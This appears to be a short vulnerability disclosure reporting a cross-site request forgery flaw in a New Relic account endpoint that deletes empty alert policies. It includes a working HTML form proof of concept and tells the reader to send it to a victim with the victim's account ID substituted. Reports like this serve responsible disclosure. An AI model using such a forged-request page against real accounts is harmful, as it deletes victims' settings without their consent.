Summary:

A CSRF vulnerability is found in the application, using which an attacker can delete all empty application policy.

###Steps to reproduce###

Create a html file using following code:
<html>
  <body>
    <form action="https://rpm.newrelic.com/accounts/1272501/application_alert_policies/remove_empty_policies">
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

send it to victim.

###Note : Make sure you change the account id to the victims id.
